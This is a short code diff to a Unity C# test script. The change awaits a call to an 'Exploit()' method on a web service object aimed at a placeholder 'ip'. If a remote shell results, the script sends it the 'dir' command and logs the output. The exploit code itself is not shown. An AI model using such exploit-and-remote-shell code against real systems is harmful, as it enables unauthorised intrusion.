@@ -18,7 +18,11 @@ public class Test : MonoBehaviour
             "ip"
             );
         
-        inputWebService.Exploit();
+        await inputWebService.Exploit();
+        if (inputWebService.Shell != null)
+        {
+            Debug.Log(await inputWebService.Shell.SendCommand("dir"));
+        }
     }
 
     // Update is called once per frame
